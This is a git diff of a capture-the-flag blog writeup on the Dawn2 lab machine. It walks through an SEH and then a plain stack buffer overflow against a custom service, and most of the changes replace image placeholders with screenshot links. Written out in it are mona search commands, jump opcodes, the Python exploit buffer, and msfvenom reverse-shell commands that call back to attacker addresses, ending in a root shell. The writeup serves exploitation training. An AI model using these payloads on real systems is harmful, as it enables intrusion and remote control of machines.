@@ -140,7 +140,7 @@ Nmap done: 1 IP address (1 host up) scanned in 106.10 seconds
 
 Awesome, we know from the scan for Dawn2 1985 was the port of the unknown service so we're definitely somewhere. Interestingly scanning seems to have crashed the service.
 
-**insert image of crash**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-SEHCrashonScan.png)
 
 But if we interact with the service running on Dawn2 with netcat
 
@@ -157,11 +157,11 @@ Cool even though we are crashing it with our scans - the server is being restart
 
 Let's restart our copy of the server with immunity and send our payload
 
-**PICTURE OF INITIAL CRASH**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-SEHtrigged.png)
 
 See where the instruction pointer is? Dead Giveaway for SEH (I'll explain what that is in a bit). And If we step through it.
 
-**PICTURE OF INSTRUCTION POINTER**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-SEHChain.png)
 
 Yup, looks like a SEH overflow. We can see our unique string of *42346142* in both the EIP and the SEH Chain window. 42346142 itself translates to Ba4B (accounting for endianess)
 
@@ -188,29 +188,30 @@ And with a little bit of math.
 
 Resend our payload 
 
-**insert screenshot of EIP**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-SEHEIPCONTROL.png)
 
 and as indicated by our 42s we have control of the instruction pointer, also double checking the DUMP output it looks like we only actually have 128 bytes to play with (78+8 in Hex = 128 Decimal, meaning our payload would only actually be 925 bytes) chalk it up to our yolo nature of our fuzzing... now to see if we can actually control the execution flow.
 
 Let's restart the server and search for a usuable module via ```!mona modules```
 
-**screenshot of modules**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-Monamodules.png)
 
-we can see only the dawn.exe module itself is usuable because it has an address that doesn't begin with a null byte as well as not having being compiled with any protections. If we do ```!mona seh -r dawn.exe -cpb "\x00"``` it'll tell immunity do search for pop pop ret addresses inside of dawn.exe while also filtering out any addresses that begin with a NULL byte as well as writing it out to a text file. It'll give you alot of potential addresses to use let's try "\xBA\x59\x58\x34" (endianess)
+we can see only the dawn.exe module itself is usuable because it has an address that doesn't begin with a null byte as well as not having being compiled with any protections. If we do ```!mona seh -dawn.exe -cpb "\x00"``` it'll tell immunity do search for pop pop ret addresses inside of dawn.exe while also filtering out any addresses that begin with a NULL byte as well as writing it out to a text file. It'll give you alot of potential addresses to use but I'm going try "\xBA\x59\x58\x34" (0x345859BA) which was one of the addresses lower down the textfile.
 
 At this point we would also test for bad characters, we would send all 255 Extended-ASCII characters in hexformat (\x01\x02\..) to see if there was any wierd behaviour in the application dump - NULL bytes, duplication etc which would affect our shellcode. (Remember, we only have 128 in the filler section so we'll have to split and pad it accordingly)
 
-**SCREENS OF DUMPS**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-Badchars1.png)
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-Badchars2.png)
 
 Cool looks clean.
 
 So lets set a breakpoint on "0x345859BA" in immunity and see if we hit it.
 
-**Screen of Hit**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-SEHbreak.png)
 
-**Screen of As**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-RowofAs.png)
 
-Cool, looks like we have 4 bytes of space to play with before our POP POP RET address. Which is more than enough for some JMP SHORTs, we can look for these codes using ```msf-nasm_shell```
+Cool, and looks like we have 4 bytes of space to play with before our POP POP RET address. Which is more than enough for some JMP SHORTs, we can look for these codes using ```msf-nasm_shell```
 
 Doing some quick maths (and some trial and error cause I can't actually count) we want two Opcodes one jmp short to go -5 and one regular jmp to go -782 to the start of our payload.
 ```
@@ -235,9 +236,10 @@ Add these two our code as such,
 
 ```
 
-**Insert ROW of As and the JMP**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-SEHTHEJUMPS.png)
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-SEHTOPofThePayload.png)
 
-So now that we know we have effectively hijacked the execution flow into a spot where our shellcode can live and I'm fairly confident with my counting skills. We can launch the server independently as well as generate our shellcode via ```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.165 LPORT=1985 -f py -v SHELL -b "\x00"``` notice how I'm using the same port as the service... There's a higher chance of recieving a reverseshell back if you use a port that's open on the target system because of things like firewall rules. Now obviously this isn't always the case but it's a more logical way of going about things than randomly using any old port.
+So now that we know we have effectively hijacked the execution flow into a spot where our shellcode can live and I'm fairly confident with my counting skills though I've added a print statement to measure the size of the buffer as well lol. Now We can launch the server independently and generate our shellcode via ```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.165 LPORT=1985 -f py -v SHELL -b "\x00"``` notice how I'm using the same port as the service... There's a higher chance of recieving a reverseshell back if you use a port that's open on the target system because of things like firewall rules. Now obviously this isn't always the case but it's a more logical way of going about things than randomly using any old port.
 
 ```
         NOPS = b"\x90" * 20
@@ -252,28 +254,28 @@ So now that we know we have effectively hijacked the execution flow into a spot 
         FILLER =b"\x43" * 128
         TERMINATE = b"\x00"
         buffer = NOPS + SHELL + CRASH2 + JMP + SRTJMP + EIP + FILLER + TERMINATE
-        print (len(buffer))
+        print (len(buffer)) # Debugging Size
 ```
 
-The "guts" of the exploit should look something like that. Some people may snob their nose at using a NOP sled but we got the space so why not use it? ;P
+The "guts" of the exploit should look something like that. Yeah that's a bit much for NOPS but we got the space so why not use it? ;P
 
 And...
 
-**insert gif**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-windowspoc.gif)
 
 voila! we have a working proof of concept. 
 
 and just for a bit more fun...
 
-**insert rick roll**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-windowspoc.gif)
 
 (I had to refactor the exploit into python2 for the msfvenom payload to work - don't ask, I'm not sure either, something something bytes and whitespace I think)
 
 Anyways... let's try it out on our linux target, replacing the SHELL payload with ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.70 LPORT=1985 -f py -v SHELL -b "\x00"```
 
-**Screen Shot**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-Failed.png)
 
-And it doesn't work... In my limited experience SEH exploits can be tricky - remember how the server might possible be running on WINE?, the memory addresses in the POP POP RET instruction we picked most likely do not reside in the same memory space as the one running on our target box and especially with how tight I placed my jumps would screw up where our instruction pointer lands. Or we may have made a mistake somewhere along the line.
+And it doesn't work... In my limited experience SEH exploits can be tricky - remember how the server would most likely be running on WINE?, the memory addresses in the POP POP RET instruction we picked most likely do not reside in the same memory space as the one running on our target box and especially with how tight I placed my jumps would definitely screw up where our instruction pointer lands. Or we may have made a mistake somewhere along the line.
 
 Now let's assume we haven't made a mistake... we're faced with two possible options, one where we play with our jumps and nops and hope it hits or look into egg hunting techniques as a potential solution.
 
@@ -286,13 +288,13 @@ I know that anything after 925 bytes the exploit will trigger the SEH and overfl
 
 Going through the whole cycle of generating a unique string, finding the offset and doing the "x41x42x43" dance
 
-**insert picture of new crash**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-Vanilla.png)
 
 we have more vanilla bufferoverflow scenario where the R/ESP register is pointing nicely to our shellcode at the time of the crash with plenty of space to play with and right after our EIP address as well.
 
 Do a search for a suitable jump or call esp address
 
-**jmp esp**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-VanillaCALLESP.png)
 
 Nice and finally after figuring out the appropriate padding and inserting a windows payload for the poc.
 
@@ -311,25 +313,25 @@ Nice and finally after figuring out the appropriate padding and inserting a wind
 ```
 
 
-**shell gif**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-noSEHwindowspoc.gif)
 
 We get a shell on our windows box.
 
-**shell linux gif**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-noSEHlinux.gif)
 
 And after swapping our payload, a shell on our linux box.
 
-**screenshot of ls**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-basicenumfiles.png)
 
 After some brief enumeration I notice a dawnBETA.exe windows binary.
 
-**confirm root**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-basicenumps.png)
 
 It's being run as root... and is most likely the other unknown service running on this box.
 
 Cool! The process begins again... let's go through the whole cycle once again aiming at a non-SEH exploit.
 
-**gif of dawnroot**
+![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-Rooted.gif)
 
 And we have a successful exploit resulting in a root shell.
 
@@ -337,83 +339,4 @@ My apologies if you were hoping for a writeup that more thoroughly explained the
 
 Being able to step back, come up with a different approach and explore it even if it may not work.
 
-Thanks alot for reading this! 
-
-Cheers!
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Thanks alot for reading this! Cheers!
